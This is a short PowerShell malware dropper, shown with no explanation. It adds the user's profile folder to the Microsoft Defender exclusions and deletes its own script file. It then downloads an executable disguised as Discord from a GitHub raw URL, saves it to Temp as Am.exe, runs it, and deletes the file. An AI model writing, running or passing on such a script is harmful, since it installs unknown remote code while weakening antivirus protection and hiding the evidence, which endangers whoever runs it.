Add-MpPreference -ExclusionPath $env:USERPROFILE
Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
$url = 'https://github.com/AnonAm93/1/raw/refs/heads/main/Discord.exe'
$outputFile = [System.IO.Path]::Combine($env:Temp, 'Am.exe')
Start-Sleep -Milliseconds 100 
Invoke-WebRequest -Uri $url -OutFile $outputFile
Start-Process -FilePath $outputFile
Remove-Item -LiteralPat C:\Users\Administrator\AppData\Local\Temp\2\Am.exe
